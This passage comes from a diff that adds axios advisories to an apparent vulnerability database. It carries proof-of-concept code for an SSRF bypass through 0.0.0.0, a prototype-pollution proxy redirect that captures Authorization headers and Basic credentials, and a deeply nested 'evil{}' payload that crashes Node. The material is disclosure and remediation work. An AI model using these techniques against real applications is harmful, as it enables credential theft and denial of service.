'127.0.0.1' (decimal), new URL('http://0x7f000001/').hostname \u2192 '127.0.0.1' (hex). Only 0.0.0.0 escapes normalisation.\n\n\n### PoC\n'use strict';\n\n// Verbatim copy of relevant logic from axios v1.16.1 shouldBypassProxy.js\n\nconst LOOPBACK_HOSTNAMES = new Set(['localhost']);\n\nconst isIPv4Loopback = (host) => {\n  const parts = host.split('.');\n  if (parts.length !== 4) return false;\n  if (parts[0] !== '127') return false;\n  return parts.every((p) => /^\\d+$/.test(p) && Number(p) >= 0 && Number(p) <= 255);\n};\n\nconst isLoopback = (host) => {\n  if (!host) return false;\n  if (LOOPBACK_HOSTNAMES.has(host)) return true;\n  return isIPv4Loopback(host);\n};\n\n// 1. Show URL parser does NOT normalise 0.0.0.0\nconsole.log(new URL('http://0.0.0.0/').hostname);    // \u2192 '0.0.0.0'   \u2190 NOT normalised\nconsole.log(new URL('http://0177.0.0.1/').hostname); // \u2192 '127.0.0.1' \u2190 normalised (safe)\nconsole.log(new URL('http://2130706433/').hostname);  // \u2192 '127.0.0.1' \u2190 normalised (safe)\n\n// 2. Show isLoopback fails for 0.0.0.0\nconsole.log(isLoopback('0.0.0.0'));   // \u2192 false  \u2190 BUG: should be true\nconsole.log(isLoopback('127.0.0.1')); // \u2192 true   \u2190 correct\n\nVerified output on Node.js v22 / axios v1.16.1:\n0.0.0.0     \u2190 NOT normalised by URL parser\n127.0.0.1   \u2190 octal normalised correctly\n127.0.0.1   \u2190 decimal normalised correctly\nfalse       \u2190 0.0.0.0 not detected as loopback  \u26A0\ntrue        \u2190 127.0.0.1 correctly detected\n\n### Impact\nApplications that:\n\nAccept user-supplied URLs and pass them to axios\nUse a proxy with NO_PROXY=localhost (or similar) for SSRF filtering\n\u2026can be bypassed by supplying http://0.0.0.0/<path>. Axios routes the request through the proxy (shouldBypassProxy returns false). If the proxy itself does not filter 0.0.0.0, the connection reaches the local machine \u2014 exposing internal services such as cloud IMDS endpoints, internal admin panels, or microservice APIs.\n\nFix\nMinimal (one line):\n\n- const LOOPBACK_HOSTNAMES = new Set(['localhost']);\n+ const LOOPBACK_HOSTNAMES = new Set(['localhost', '0.0.0.0']);\n\nComprehensive:\n\nconst isIPv4Unspecified = (host) => host === '0.0.0.0';\n\nconst isLoopback = (host) => {\n  if (!host) return false;\n  if (LOOPBACK_HOSTNAMES.has(host)) return true;\n  if (isIPv4Loopback(host)) return true;\n  if (isIPv4Unspecified(host)) return true;   // add this line\n  return isIPv6Loopback(host);\n};\n</details>",
+                info: [
+                  "https://github.com/axios/axios/security/advisories/GHSA-f4gw-2p7v-4548",
+                  "https://github.com/axios/axios/pull/11000",
+                  "https://github.com/axios/axios/pull/11001",
+                  "https://github.com/axios/axios/commit/1417285c69344bbcc6420a021f67dee0c6fedb2d",
+                  "https://github.com/axios/axios/commit/32fc489632377d214db55bfa4e2c48486a7d7ce2",
+                  "https://github.com/axios/axios/releases/tag/v0.33.0",
+                  "https://github.com/axios/axios/releases/tag/v1.18.0"
+                ]
+              },
+              {
+                atOrAbove: "0.31.1",
+                below: "0.33.0",
+                severity: "high",
+                cwe: [
+                  "CWE-1321",
+                  "CWE-200"
+                ],
+                identifiers: {
+                  summary: "Axios Node HTTP adapter can use an inherited proxy after interceptor config cloning",
+                  githubID: "GHSA-gcfj-64vw-6mp9",
+                  CVE: [
+                    "CVE-2026-67320"
+                  ]
+                },
+                details: "## Summary\n\nAxios\u2019 Node.js HTTP adapter can route requests through an attacker-controlled proxy when `Object.prototype.proxy` is polluted and request configuration is materialized as a regular object before dispatch.\n\nRecent axios releases harden merged request config by creating a null-prototype object. However, request interceptors run after that merge and may return a replacement config. A common immutable interceptor pattern such as `{...config}` or `Object.assign({}, config)` converts the hardened config back into a normal object. Axios then dispatches that object without re-hardening it, and the Node HTTP adapter reads `config.proxy` through the prototype chain.\n\n## Impact\n\nIn a Node.js deployment using the HTTP adapter, an attacker who can trigger prototype pollution elsewhere in the process can route affected HTTP requests through an attacker-controlled proxy.\n\nThe highest confirmed impact is for plaintext HTTP requests. The proxy can observe explicit `Authorization` headers, axios-generated Basic auth from `config.auth`, request method, absolute URL, `Host`, and request body content. The proxy can also return its own response to axios for the affected request.\n\nThis does not establish browser impact. It also does not establish HTTPS header or body disclosure under normal TLS validation.\n\n## Affected Functionality\n\nAffected functionality is limited to axios requests that use the Node.js HTTP adapter, including default Node usage when the HTTP adapter is selected and explicit `adapter: 'http'` usage.\n\nThe relevant configuration path is `config.proxy` in the Node HTTP adapter. The hardened-bypass path requires a request interceptor such as:\n\n```js\napi.interceptors.request.use((config) => ({\n  ...config,\n  headers: {\n    ...config.headers,\n    'X-App': 'demo'\n  }\n}));\n```\n\nUnaffected or mitigating conditions include browser adapters, the Node fetch adapter, no polluted `Object.prototype.proxy`, an own `proxy: false` or safe own `proxy` value on the config, and hardened releases where interceptors return the original null-prototype config instead of a regular object clone.\n\n## Technical Details\n\n`lib/core/mergeConfig.js` creates a null-prototype merged config and uses own-property reads for merged values. This is intended to prevent polluted `Object.prototype` values from affecting config behavior.\n\n`lib/core/Axios.js` runs request interceptors after the merge. In both the asynchronous and synchronous interceptor paths, axios passes the interceptor-returned config into dispatch.\n\n`lib/core/dispatchRequest.js` accepts that returned config, transforms request data, selects the adapter, and calls the adapter without re-hardening or re-normalizing the config.\n\n`lib/adapters/http.js` uses own-property reads for several sensitive fields, but the initial proxy dispatch path still passes `config.proxy` directly into `setProxy()`. If an interceptor returned a regular object, `config.proxy` can resolve to inherited `Object.prototype.proxy`.\n\n## Proof of Concept of Attack\n\n```js\nimport axios from './index.js';\nimport http from 'node:http';\n\nfor (const key of [\n  'HTTP_PROXY', 'HTTPS_PROXY', 'ALL_PROXY',\n  'http_proxy', 'https_proxy', 'all_proxy',\n  'NO_PROXY', 'no_proxy'\n]) {\n  delete process.env[key];\n}\n\nconst listen = (handler) => new Promise((resolve, reject) => {\n  const server = http.createServer(handler);\n  server.once('error', reject);\n  server.listen(0, '127.0.0.1', () => resolve(server));\n});\n\nconst close = (server) => new Promise((resolve) => server.close(resolve));\n\nconst targetHits = [];\nconst proxyHits = [];\n\nconst target = await listen((req, res) => {\n  targetHits.push(req.url);\n  res.end('target');\n});\n\nconst proxy = await listen((req, res) => {\n  let body = '';\n  req.on('data', (chunk) => body += chunk);\n  req.on('end', () => {\n    proxyHits.push({\n      url: req.url,\n      authorization: req.headers.authorization,\n      host: req.headers.host,\n      body\n    });\n    res.setHeader('content-type', 'application/json');\n    res.end('{\"server\":\"proxy\"}');\n  });\n});\n\nObject.prototype.proxy = {\n  protocol: 'http',\n  host: '127.0.0.1',\n  port: proxy.address().port\n};\n\nconst api = axios.create();\n\napi.interceptors.request.use((config) => ({\n  ...config,\n  headers: {\n    ...config.headers,\n    'X-App': 'demo'\n  }\n}));\n\ntry {\n  const url = `http://127.0.0.1:${target.address().port}/api/secret`;\n\n  const res = await api.post(\n    url,\n    {secret: 'request-body-secret'},\n    {headers: {Authorization: 'Bearer EXPLICIT_SECRET'}}\n  );\n\n  console.log({\n    response: res.data,\n    targetHits,\n    proxyHits,\n    finalConfigHasOwnProxy: Object.hasOwn(res.config, 'proxy')\n  });\n} finally {\n  delete Object.prototype.proxy;\n  await close(target);\n  await close(proxy);\n}\n```\n\nExpected vulnerable result: the response comes from the proxy, `targetHits` is empty, and `proxyHits` contains the absolute URL, authorization header, host header, and request body.\n\n## Workarounds\n\nSet an own `proxy: false` on affected requests or on an axios instance when proxy support is not required.\n\nAvoid request interceptors that return regular object clones of config in hardened releases. Returning the original config or cloning into a null-prototype object avoids this specific bypass, but this is fragile and should not replace a fix.\n\nUse the Node fetch adapter for affected requests where its behavior is compatible with the application.\n\n<details>\n<summary>Original Report</summary>\n\n## Summary\n\n  Axios hardens merged request config by creating a null-prototype object, preventing polluted Object.prototype properties from influencing request behavior. Request interceptors run after that hardening, and a normal immutable\n  interceptor pattern such as {...config} or Object.assign({}, config) re-materializes the config as a regular object. Axios then dispatches that interceptor-returned object without re-hardening it. In the Node HTTP adapter, config.proxy\n  is read through the prototype chain, allowing a polluted Object.prototype.proxy to route authenticated HTTP requests through an attacker-controlled proxy.\n\n  ## Impact\n\n  In a Node.js deployment using the HTTP adapter, an attacker who can trigger prototype pollution elsewhere in the process can cause affected axios requests to be sent through an attacker-controlled proxy when the application uses a\n  request interceptor that returns a plain object copy of the config.\n\n  Verified local impact:\n\n  - Authenticated request redirection to attacker-controlled proxy.\n  - Disclosure of explicit Authorization headers.\n  - Disclosure of axios-generated Basic auth headers from config.auth.\n  - Disclosure of request metadata: method, absolute URL, Host header.\n  - Disclosure of POST body content.\n\n  This report does not claim browser impact or proven HTTPS credential disclosure. The demonstrated credential and body disclosure is for Node HTTP-adapter requests over HTTP/plaintext.\n\n  ## Affected component\n\n  The affected component is the Node.js HTTP adapter request path after request interceptors have run.\n\n  The issue requires:\n\n  - Node.js HTTP adapter usage.\n  - A polluted Object.prototype.proxy.\n  - A request interceptor that returns a plain object copy of the config.\n  - No own proxy: false or safe own proxy property on the request config.\n\n  ## Affected versions\n\n  Confirmed affected for this specific hardening-bypass variant:\n\n  - axios@1.15.2\n  - axios@1.16.0\n\n  axios@1.16.0 was the latest published version observed via npm view axios version during validation.\n\n  Related older behavior observed during testing:\n\n  - 1.13.0, 1.13.6, 1.14.0, 1.15.0, and 1.15.1 routed via inherited Object.prototype.proxy even without the interceptor re-materialization step. That is related background, not the narrowed hardening-bypass variant described here.\n\n  ## Root cause\n\n  1. Initial hardening\n\n     Axios initially hardens merged request config by creating a null-prototype object in mergeConfig(), which is meant to prevent inherited Object.prototype properties from influencing request behavior.\n     Permalink: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/lib/core/mergeConfig.js#L21-L25\n  2. Interceptor re-materialization\n\n     Request interceptors run after that hardening step, and axios allows an interceptor to return a replacement config object. A common immutable pattern such as {...config} or Object.assign({}, config) converts the hardened null-\n     prototype config back into a normal object with Object.prototype as its prototype.\n     Permalinks: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/lib/core/Axios.js#L187-L199, https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/lib/core/Axios.js#L204-L218\n  3. No post-interceptor re-hardening\n\n     Axios passes the interceptor-returned config into request dispatch without restoring the null-prototype property or otherwise normalizing the object into an own-property-only structure.\n     Permalink: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/lib/core/dispatchRequest.js#L34-L48\n  4. Prototype-chain read of proxy in the Node adapter\n\n     The Node HTTP adapter later consults config.proxy, and this read is reachable through the prototype chain once the interceptor has re-materialized the config as a normal object. As a result, a polluted Object.prototype.proxy can\n     redirect the outgoing authenticated request through an attacker-controlled proxy.\n     Permalink: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/lib/adapters/http.js#L816-L820\n\n  ## Why this is a security issue and not intended behavior\n\n  Axios\u2019 threat model explicitly treats polluted Object.prototype config reads as high-impact read-side gadgets and states that axios defends reachable config-read gadgets through own-property checks and null-prototype structures. The\n  existing regression tests also assert that a polluted Object.prototype.proxy must not route requests through an attacker proxy.\n\n  This behavior is therefore a bypass of axios\u2019 existing prototype-pollution hardening, not merely a generic \u201Cpolluted process\u201D complaint. The interceptor does not need to be malicious; it can be ordinary application code that returns an\n  immutable copy of the config. The attacker-controlled piece is the polluted prototype property supplied by a separate vulnerability or dependency.\n\n  ## Realistic threat model\n\n  A realistic exploit chain is:\n\n  1. A transitive dependency or upstream parser bug allows prototype pollution in a Node.js process.\n  2. The polluted property is Object.prototype.proxy, with host and port pointing to an attacker-controlled proxy.\n  3. The application uses axios with a request interceptor that returns a plain object copy, such as adding headers immutably.\n  4. The application sends an HTTP request with credentials or sensitive body data.\n  5. Axios routes that request through the inherited proxy configuration.\n\n  This requires a prototype pollution primitive and a compatible interceptor pattern. It does not require the attacker to control the interceptor.\n\n  ## Proof of concept\n\n  Save as poc.mjs in the axios repository root:\n\n```js\n  import axios from './index.js';\n  import http from 'node:http';\n\n  const proxyEnvKeys = [\n    'HTTP_PROXY', 'HTTPS_PROXY', 'ALL_PROXY',\n    'http_proxy', 'https_proxy', 'all_proxy',\n    'NO_PROXY', 'no_proxy'\n  ];\n\n  for (const key of proxyEnvKeys) delete process.env[key];\n\n  const listen = (handler) => new Promise((resolve, reject) => {\n    const server = http.createServer(handler);\n    server.once('error', reject);\n    server.listen(0, '127.0.0.1', () => resolve(server));\n  });\n\n  const close = (server) => new Promise((resolve) => server.close(resolve));\n\n  const targetHits = [];\n  const proxyHits = [];\n\n  const target = await listen((req, res) => {\n    let body = '';\n    req.on('data', (chunk) => body += chunk);\n    req.on('end', () => {\n      targetHits.push({\n        url: req.url,\n        method: req.method,\n        authorization: req.headers.authorization || null,\n        body\n      });\n      res.writeHead(200, {'Content-Type': 'application/json'});\n      res.end(JSON.stringify({server: 'target'}));\n    });\n  });\n\n  const proxy = await listen((req, res) => {\n    let body = '';\n    req.on('data', (chunk) => body += chunk);\n    req.on('end', () => {\n      proxyHits.push({\n        url: req.url,\n        method: req.method,\n        authorization: req.headers.authorization || null,\n        host: req.headers.host || null,\n        body\n      });\n      res.writeHead(200, {'Content-Type': 'application/json'});\n      res.end(JSON.stringify({server: 'proxy'}));\n    });\n  });\n\n  Object.prototype.proxy = {\n    protocol: 'http',\n    host: '127.0.0.1',\n    port: proxy.address().port\n  };\n\n  const api = axios.create();\n\n  api.interceptors.request.use((config) => ({\n    ...config,\n    headers: {\n      ...config.headers,\n      'X-App': 'demo'\n    }\n  }));\n\n  try {\n    const url = `http://127.0.0.1:${target.address().port}/api/secret`;\n\n    const explicit = await api.get(url, {\n      headers: {Authorization: 'Bearer EXPLICIT_SECRET'}\n    });\n\n    proxyHits.length = 0;\n    targetHits.length = 0;\n\n    const basic = await api.get(url, {\n      auth: {username: 'svc-account', password: 'prod-secret'}\n    });\n\n    proxyHits.length = 0;\n    targetHits.length = 0;\n\n    const post = await api.post(url, {secret: 'request-body-secret'}, {\n      headers: {Authorization: 'Bearer EXPLICIT_SECRET'}\n    });\n\n    console.log(JSON.stringify({\n      explicitResponse: explicit.data,\n      basicResponse: basic.data,\n      postResponse: post.data,\n      targetHits,\n      proxyHits,\n      finalConfigPrototype:\n        Object.getPrototypeOf(post.config) === Object.prototype\n          ? 'Object.prototype'\n          : 'other',\n      finalConfigHasOwnProxy:\n        Object.prototype.hasOwnProperty.call(post.config, 'proxy')\n    }, null, 2));\n  } finally {\n    delete Object.prototype.proxy;\n    await close(target);\n    await close(proxy);\n  }\n```\n\n  Run:\n```bash\n  npm ci\n  node poc.mjs\n```\n\n  ## Observed results\n\n  Representative observed output from local loopback testing:\n\n```text\n\n  {\n    \"explicitResponse\": {\"server\": \"proxy\"},\n    \"basicResponse\": {\"server\": \"proxy\"},\n    \"postResponse\": {\"server\": \"proxy\"},\n    \"targetHits\": [],\n    \"proxyHits\": [\n      {\n        \"url\": \"http://127.0.0.1:40613/api/secret\",\n        \"method\": \"POST\",\n        \"authorization\": \"Bearer EXPLICIT_SECRET\",\n        \"host\": \"127.0.0.1:40613\",\n        \"body\": \"{\\\"secret\\\":\\\"request-body-secret\\\"}\"\n      }\n    ],\n    \"finalConfigPrototype\": \"Object.prototype\",\n    \"finalConfigHasOwnProxy\": false\n  }\n\n  Additional validation showed axios-generated Basic auth is also disclosed to the proxy:\n\n  {\n    \"authorization\": \"Basic c3ZjLWFjY291bnQ6cHJvZC1zZWNyZXQ=\"\n  }\n\n```\n\n  That value decodes to:\n\n  svc-account:prod-secret\n\n  Negative controls were also tested:\n\n  - No interceptor: target receives request, proxy receives none.\n  - Interceptor mutating and returning the same config object: proxy receives none.\n  - Own proxy: false: proxy receives none.\n  - Null-prototype clone interceptor: proxy receives none.\n  - Fetch adapter in Node with the same interceptor: proxy receives none.\n\n  ## Suggested remediation\n\n  Re-harden the final request config after all request interceptors and before adapter dispatch. This should cover both asynchronous and synchronous interceptor paths.\n\n  A practical fix would be to normalize the interceptor-returned object into a null-prototype, own-property-only config before calling dispatchRequest(), or at the start of dispatchRequest() itself. Security-sensitive adapter reads should\n  also consistently use own-property access helpers. In particular, the Node HTTP adapter should not read config.proxy through the prototype chain.\n\n  ## Minimal regression test\n\n  Add an end-to-end Node HTTP adapter test that:\n\n  1. Starts a target server and attacker proxy on 127.0.0.1.\n  2. Sets Object.prototype.proxy to the attacker proxy.\n  3. Adds a request interceptor returning {...config, headers: {...config.headers}}.\n  4. Sends a request with an Authorization header.\n  5. Asserts the target server receives the request.\n  6. Asserts the attacker proxy receives no request.\n  7. Asserts the final config no longer exposes inherited proxy.\n\n  A second assertion can cover config.auth to ensure axios-generated Basic auth is not sent to the attacker proxy.\n\n  ## References / permalinks\n\n  - mergeConfig() null-prototype hardening: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/lib/core/mergeConfig.js#L21-L25\n  - Async interceptor dispatch path: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/lib/core/Axios.js#L187-L199\n  - Synchronous interceptor dispatch path: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/lib/core/Axios.js#L204-L218\n  - dispatchRequest() receives interceptor-returned config: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/lib/core/dispatchRequest.js#L34-L48\n  - Node HTTP adapter config.proxy read: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/lib/adapters/http.js#L816-L820\n  - Axios threat model for prototype-pollution read-side gadgets: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/THREATMODEL.md#L136-L144\n  - Existing proxy pollution regression test intent: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/tests/unit/prototypePollution.test.js#L1098-L1135\n</details>",
+                info: [
+                  "https://github.com/axios/axios/security/advisories/GHSA-gcfj-64vw-6mp9",
+                  "https://github.com/axios/axios/pull/11000",
+                  "https://github.com/axios/axios/pull/11001",
+                  "https://github.com/axios/axios/commit/1417285c69344bbcc6420a021f67dee0c6fedb2d",
+                  "https://github.com/axios/axios/commit/32fc489632377d214db55bfa4e2c48486a7d7ce2",
+                  "https://github.com/axios/axios/releases/tag/v0.33.0",
+                  "https://github.com/axios/axios/releases/tag/v1.18.0"
+                ]
+              },
+              {
+                atOrAbove: "0.31.1",
+                below: "0.33.0",
+                severity: "medium",
+                cwe: [
+                  "CWE-674"
+                ],
+                identifiers: {
+                  summary: "Axios form serializer maxDepth bypass via {} metatoken",
+                  githubID: "GHSA-hcpx-6fm6-wx23",
+                  CVE: [
+                    "CVE-2026-67321"
+                  ]
+                },
+                details: "## Summary\n\nAxios versions in the fixed lines for GHSA-62hf-57xw-28j9 still contain an incomplete depth-limit bypass in `lib/helpers/toFormData.js`. When serializing an object with a top-level key ending in `{}`, axios calls `JSON.stringify()` on that value before the `formSerializer.maxDepth` guard can inspect the nested structure.\n\nAn attacker who can control object keys and nested values passed by an application into axios form or parameter serialization can trigger a raw `RangeError: Maximum call stack size exceeded`, causing a denial of service in the affected request path.\n\n## Impact\n\nThe impact is availability only. No confidentiality or integrity impact was confirmed.\n\nServer-side applications are the primary concern when they accept user-controlled input and pass it into axios as `data` or `params` for `multipart/form-data`, `application/x-www-form-urlencoded`, or default parameter serialization. Browser impact is limited to the page or request context unless the application builds a broader failure mode around the thrown exception.\n\nThe attack requires control over a top-level object key ending in `{}` and a deeply nested object value. The option `formSerializer.metaTokens: false` is not a workaround because it only changes the emitted key name; the value is still stringified.\n\n## Affected Functionality\n\nAffected paths include:\n\n- `lib/helpers/toFormData.js` when a top-level key ends with `{}`.\n- `lib/helpers/toURLEncodedForm.js`, which delegates to `helpers.defaultVisitor`.\n- `lib/helpers/AxiosURLSearchParams.js`, used by default params serialization.\n- Request transforms in `lib/defaults/index.js` when object data is serialized as `multipart/form-data` or `application/x-www-form-urlencoded`.\n\nUnaffected paths include:\n\n- Already-created `FormData` or `URLSearchParams` values that axios does not walk with `toFormData`.\n- Custom `paramsSerializer.serialize` implementations that do not call axios `toFormData`.\n- Non-`{}` deeply nested values in `toFormData`, which hit `ERR_FORM_DATA_DEPTH_EXCEEDED` as intended.\n\n## Technical Details\n\nIn `lib/helpers/toFormData.js`, `defaultVisitor()` handles top-level keys ending in `{}` before recursive traversal:\n\n```js\nif (value && !path && typeof value === 'object') {\n  if (utils.endsWith(key, '{}')) {\n    key = metaTokens ? key : key.slice(0, -2);\n    value = JSON.stringify(value);\n  }\n}\n```\n\nThe depth guard is in `build()`:\n\n```js\nif (depth > maxDepth) {\n  throw new AxiosError(\n    'Object is too deeply nested (' + depth + ' levels). Max depth: ' + maxDepth,\n    AxiosError.ERR_FORM_DATA_DEPTH_EXCEEDED\n  );\n}\n```\n\nFor `{}` metatoken values, `build()` only sees the top-level property. The nested value is handed directly to native `JSON.stringify()`, which recurses internally and can throw `RangeError` before axios emits the intended `AxiosError`.\n\n## Proof of Concept of Attack\n\nSafe local PoC with no network I/O:\n\n```js\nimport toFormData from './lib/helpers/toFormData.js';\n\nfunction buildDeep(depth) {\n  const head = {};\n  let cur = head;\n\n  for (let i = 0; i < depth; i += 1) {\n    cur.x = {};\n    cur = cur.x;\n  }\n\n  return head;\n}\n\ntry {\n  toFormData({ 'evil{}': buildDeep(10000) });\n} catch (err) {\n  console.log(err.name, err.code || '', err.message);\n}\n\n// Expected affected result:\n// RangeError  Maximum call stack size exceeded\n```\n\nExpected fixed behavior is an `AxiosError` with code `ERR_FORM_DATA_DEPTH_EXCEEDED`.\n\n## Workarounds\n\nReject or depth-limit untrusted objects before passing them to axios serialization.\n\nStrip or reject top-level keys ending in `{}` from untrusted objects when using axios form serialization.\n\nFor query parameters, use a custom `paramsSerializer.serialize` that enforces a depth limit.\n\nFor form bodies, construct `FormData` or `URLSearchParams` manually after validating input depth.\n\n<details>\n<summary>Original Report</summary>\n\n## Summary\nThe `maxDepth=100` guard added in axios 1.15.0 to fix GHSA-62hf-57xw-28j9 lives inside the `build()` recursion in `lib/helpers/toFormData.js`. The default visitor at `lib/helpers/toFormData.js:166-170` still has a top-level shortcut that calls `JSON.stringify(value)` whenever a key ends in `'{}'`, before `build()` ever sees the nested value. JSON.stringify on a deeply nested object stack-overflows with `RangeError: Maximum call stack size exceeded`, which propagates synchronously out of the axios call. The exact attacker-data flow that the original advisory described (proxy-style code that forwards client JSON into `axios({ data, params })`) still crashes the process at depth ~3000 on a default Node.js stack, despite v1.16.0 being patched.\n\n## Details\nAffected: axios 1.15.0 - 1.16.0 (every released version that carries the GHSA-62hf-57xw-28j9 fix). The bug is reachable from any code path that hits `toFormData`, which includes:\n\n- `axios.post(url, data, { headers: { 'content-type': 'application/x-www-form-urlencoded' } })` -> `defaults.transformRequest` -> `toURLEncodedForm(data)` -> `toFormData`\n- `axios.post(url, data, { headers: { 'content-type': 'multipart/form-data' } })` -> same path via `toFormData`\n- `axios.get(url, { params })` -> `buildURL` -> `new AxiosURLSearchParams(params)` -> `toFormData`\n\nVulnerable code, `lib/helpers/toFormData.js`:\n\n```javascript\n// 156 function defaultVisitor(value, key, path) {\n// 165 if (value && !path && typeof value === 'object') {\n// 166 if (utils.endsWith(key, '{}')) {\n// 167 // eslint-disable-next-line no-param-reassign\n// 168 key = metaTokens ? key : key.slice(0, -2);\n// 169 // eslint-disable-next-line no-param-reassign\n// 170 value = JSON.stringify(value); // <-- V8 native, NOT depth-checked\n// 171 } else if (...\n```\n\n`build()` later does enforce `maxDepth`:\n\n```javascript\n// 211 function build(value, path, depth = 0) {\n// 212 if (utils.isUndefined(value)) return;\n// 213\n// 214 if (depth > maxDepth) {\n// 215 throw new AxiosError(\n// 216 'Object is too deeply nested (' + depth + ' levels). Max depth: ' + maxDepth,\n// 217 AxiosError.ERR_FORM_DATA_DEPTH_EXCEEDED\n// 218 );\n```\n\nThe `'{}'` shortcut runs in `defaultVisitor`, which is invoked from inside `build()` for top-level keys (the `!path` clause at line 165 means the shortcut only triggers at top level, where `path` is `undefined`). At that point `depth === 0` and the maxDepth check has already passed; the recursion-aware guard never sees the nested value because `defaultVisitor` reassigns `value = JSON.stringify(value)` and returns the rendered string straight to `formData.append`. JSON.stringify itself is recursive in V8 and stack-overflows on deeply nested objects, throwing `RangeError` synchronously.\n\nThe behaviour is independent of the `metaTokens` option: line 168 only changes whether `'{}'` stays on the key name, line 170 stringifies regardless. `toURLEncodedForm`'s wrapper visitor in `lib/helpers/toURLEncodedForm.js:11-14` falls through to the same `defaultVisitor`, so the form-encoded path is also affected.\n\nThe attacker payload is a single top-level key ending in `'{}'` whose value is a nested object. The keys themselves do not have to be deep, so the payload is small to send (a few KB of `{\"x\":{\"x\":...}}` produces enough nesting to overflow). The original advisory's threat model -- a server that forwards `req.body` or `req.query` into axios -- is unchanged:\n\n```javascript\napp.post('/forward', async (req, res) => {\n await axios.post('https://upstream/api', req.body); // req.body attacker-controlled\n res.send('ok');\n});\n// attacker POST /forward with content-type: application/x-www-form-urlencoded\n// body: {\"evil{}\": <8000-deep object>}\n// -> JSON.stringify recurses inside defaultVisitor -> RangeError -> handler crashes\n```\n\nThe error is not an `AxiosError`; it is a raw `RangeError` thrown from the stringifier, so handlers that look for `err.code === 'ERR_FORM_DATA_DEPTH_EXCEEDED'` (the documented signal that the maxDepth guard fired) do not see it. Synchronous startup paths or worker threads still take the whole process down.\n\nThe fix is to also depth-limit (or pre-walk) the value before calling `JSON.stringify` on line 170, or to remove the top-level `'{}'` shortcut and rely on the depth-checked `build()` recursion to handle it. A minimal patch that preserves observable behaviour for legal payloads:\n\n```diff\n if (utils.endsWith(key, '{}')) {\n // eslint-disable-next-line no-param-reassign\n key = metaTokens ? key : key.slice(0, -2);\n+ // Reject objects that would exceed maxDepth before handing to JSON.stringify,\n+ // which is recursive in V8 and stack-overflows on deeply nested input.\n+ (function checkDepth(v, d) {\n+ if (d > maxDepth) {\n+ throw new AxiosError(\n+ 'Object is too deeply nested (' + d + ' levels). Max depth: ' + maxDepth,\n+ AxiosError.ERR_FORM_DATA_DEPTH_EXCEEDED\n+ );\n+ }\n+ if (v && typeof v === 'object') {\n+ for (const k in v) checkDepth(v[k], d + 1);\n+ }\n+ })(value, 0);\n // eslint-disable-next-line no-param-reassign\n value = JSON.stringify(value);\n }\n```\n\n(The recursion in `checkDepth` itself is bounded by `maxDepth`, so it cannot itself overflow.)\n\n## PoC\nReproduces against a clean clone of `axios/axios` at v1.16.0 with `npm install` already run. `targets/axios/poc_jsonstringify_dos.mjs` is the script:\n\n```javascript\nimport axios from './source/index.js';\n\nfunction buildDeep(depth) {\n let head = {};\n let cur = head;\n for (let i = 0; i < depth; i++) { cur.x = {}; cur = cur.x; }\n return head;\n}\n\nconst malicious = buildDeep(5000);\nconst safeAdapter = () => Promise.resolve({\n data: 'never reached', status: 200, statusText: 'OK', headers: {}, config: {}\n});\n\n// 1. POST x-www-form-urlencoded\ntry {\n await axios.post('http://example.test/x',\n { 'evil{}': malicious },\n { headers: { 'content-type': 'application/x-www-form-urlencoded' }, adapter: safeAdapter });\n} catch (e) {\n console.log('POST form-encoded:', e.name, '-', e.message);\n}\n\n// 2. GET with params\ntry {\n await axios.get('http://example.test/x',\n { params: { 'evil{}': malicious }, adapter: safeAdapter });\n} catch (e) {\n console.log('GET params:', e.name, '-', e.message);\n}\n```\n\n3/3 runs reproduce the same `RangeError` on `axios@1.16.0` with Node.js 24:\n\n```\n$ node poc_jsonstringify_dos.mjs\nPOST form-encoded: RangeError - Maximum call stack size exceeded\nGET params: RangeError - Maximum call stack size exceeded\n```\n\n`safeAdapter` is a stub that returns a fake response, so the crash is provably inside axios's serialization layer, not in HTTP I/O. Removing the `'{}'` suffix from the key and re-running gives the expected `AxiosError: Object is too deeply nested ... ERR_FORM_DATA_DEPTH_EXCEEDED` from the maxDepth guard, confirming the fix is wired correctly elsewhere -- it just does not cover this branch.\n\nCrash threshold on a default-stack Node.js process is roughly depth 2500-3000; 8000 is comfortably above that, and the payload is a few KB.\n\n## Impact\nA remote, unauthenticated attacker who can influence an object that the application passes to axios as request `data` or `params` triggers an uncaught `RangeError` from inside the synchronous `JSON.stringify` call in `defaultVisitor`. In server-side applications that proxy or re-forward client JSON through axios -- the same threat model that motivated GHSA-62hf-57xw-28j9 -- this crashes the request handler and, in worker/cluster setups, the whole process. The previously shipped `maxDepth` guard does not stop it because the `'{}'` suffix path bypasses `build()` entirely. Same severity class as the original advisory (CWE-674 Uncontrolled Recursion, network-reachable DoS); the only difference is the attacker has to suffix one of their object keys with `'{}'` to land on the unguarded code path.\n</details>",
+                info: [
+                  "https://github.com/axios/axios/security/advisories/GHSA-hcpx-6fm6-wx23",
+                  "https://github.com/axios/axios/pull/11000",
+                  "https://github.com/axios/axios/pull/11001",
+                  "https://github.com/axios/axios/commit/1417285c69344bbcc6420a021f67dee0c6fedb2d",
+                  "https://github.com/axios/axios/commit/32fc489632377d214db55bfa4e2c48486a7d7ce2",
+                  "https://github.com/axios/axios/releases/tag/v0.33.0",
+                  "https://github.com/axios/axios/releases/tag/v1.18.0"
+                ]
+              },
+              {
+                atOrAbove: "0",
+                below: "0.33.0",
+                severity: "medium",
+                cwe: [
+                  "CWE-1321"
+                ],
+                identifiers: {
+                  summary: "Axios: Prototype pollution gadgets can alter axios request construction",
+                  githubID: "GHSA-mmx7-hfxf-jppx",
+                  CVE: [
+                    "CVE-2026-67316"
+                  ]
+                },
